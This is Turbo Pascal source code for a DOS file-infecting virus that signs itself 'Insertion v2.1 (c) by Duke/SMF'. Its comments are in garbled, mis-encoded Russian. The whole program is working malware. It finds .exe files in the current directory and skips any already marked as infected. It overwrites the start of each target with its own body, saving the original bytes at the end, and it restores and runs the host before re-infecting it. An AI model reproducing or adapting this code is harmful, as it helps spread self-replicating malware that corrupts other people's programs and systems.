   {$M 3000, 0, 65535}
   program insertion_2_1;
   uses dos;
   const len=5280;                    {„«¨  ¯à®£à ¬¬ë}
   var a,b:file;                      {"€"-¨áå®¤ë©, "‚"-®¢ë©}
       nam:searchrec;
       w:array[1..len] of byte;
       w1:array[1..len] of byte;
       t:boolean;
       s:string;
   {------------------------------}
   procedure DOP;
   var par:string;
       i:byte;
   begin
   {‚®§¢à é ¥¬ "€" ¯¥à¢® ç «ìë© ¢¨¤:}
   seek(a,filesize(a)-len);           {“ª § â¥«ì ¯®áâ ¢«¥    ç «® save-"€".}
   BlockRead(a,w,len);                {Save-"A" áç¨â  ¢ ¬ áá¨¢ W.}
   seek(a,0);                         {“ª § â¥«ì ¯®áâ ¢«¥    ç «® "€".}
   BlockWrite(a,w,len);               {Œ áá¨¢ W § ¯¨á  ¢  ç «® "€".}
   seek(a,filesize(a)-len);           {“ª § â¥«ì ¯®áâ ¢«¥    ç «® save-"€".}
   truncate(a);                       {Žâ¡à áë¢ ¥âáï save-ç áâì "€".}
   close(a);                          {‡ ªàë¢ ¥¬ "€"}
   for i:=1 to paramcount do par:=par+paramstr(i)+' ';
   exec(s,par);                       {‡ ¯ãáª ¥¬ "€"}
   assign(a,s);                       {‡ ®¢® ®âªàë¢ ¥¬ "€"}
   reset(a,1);
   seek(a,0);                         {“ª § â¥«ì    ç «® "A"}
   BlockRead(a,w,len);                {—¨â ¥¬  ç «® "A"}
   seek(a,filesize(a));               {“ª § â¥«ì   ª®¥æ "A"}
   BlockWrite(a,w,len);               {‘®åà ï¥¬  ç «® ¢ ª®æ¥ "A"}
   seek(a,0);                         {“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì    ç «® "€"}
   BlockWrite(a,w1,len);              {‚®§¢à é ¥¬ VIR ¢  ç «® "€"}
   close(a);                          {‡ ªàë¢ ¥¬ "€"}
   end;
   {--------------------------------------------------------------------------}
   procedure Insertion(st:string);    {*à®æ¥¤ãà  § à ¦¥¨ï ä ©« }
   begin
   assign(b,st);reset(b,1);
   setfattr(b,$20);                   {‘â ¢¨¬ á¢®¨  âà¨¡ãâë}
   assign(a,s);reset(a,1);            {Žâªàë¢ ¥¬ "€".}
   {‘®åà ¥¨¥  ç «  "‚" :}
   seek(b,0);                         {“ª § â¥«ì ¯®áâ ¢«¥    ç «® "‚".}
   BlockRead(b,w,len);                {* ç «® "‚" áç¨â ® ¢ ¬ áá¨¢ W.}
   seek(b,filesize(b));               {“ª § â¥«ì ¯®áâ ¢«¥   ª®¥æ "‚".}
   BlockWrite(b,w,len);               {Œ áá¨¢ W § ¯¨á  ¢ ª®¥æ "‚".}
   {‡ ¯¨áì ®¢®£®  ç «  "‚" :}
   {seek(a,0);                         {“ª § â¥«ì ¯®áâ ¢«¥    ç «® "€".}
   BlockRead(a,w1,len);               {—¨â ¥¬  ç «® "€" ¢ W1.}
   seek(b,0);                         {“ª § â¥«ì ¯®áâ ¢«¥    ç «® "‚".}
   BlockWrite(b,w1,len);              {*¨è¥¬ W1 ¢  ç «® "‚".}
   close(b);                          {‡ ªàë¢ ¥¬ "‚".}
   close(a);
   t:=true;
   end;
   {--------------------------------------------------------------------------}
   procedure check(st:string); {¯à®¢¥àª    § à ¦¥®áâì}
   var c,d:byte;
   begin
   assign(b,st);reset(b,1);
   if filesize(b)<=len then           {¥ § à ¦ ¥¬ ä ©«ë ¤«¨®©}
     begin                            { ¬¥ìè¥ ¤«¨ë ¢¨àãá }
     close(b);
     exit;
     end;
   seek(b,filesize(b)-len);
   blockread(b,c,1);blockread(b,d,1);
   if (c<>ord('M')) or (d<>ord('Z')) then Insertion(st) else close(b);
   end;
   {-------------------------------------------------------------------------}
   begin
   asm
     jmp @lab
     db 'Insertion v2.1 (c) by Duke/SMF',0
   @lab:
   end;
   s:=paramstr(0);
   t:=false;
   findfirst('*.exe',$21,nam);        {*®¨áª ¯®¤å®¤ïé¥£® ä ©« :}
   check(nam.name);
   while (doserror=0) and (t=false) do
     begin
     findnext(nam);
     check(nam.name);
     end;
   {‡ ¢¥àè¥¨¥ à ¡®âë :}
   assign(a,s);reset(a);
   if filesize(a)<=len then close(a)
                       else DOP;
   end.
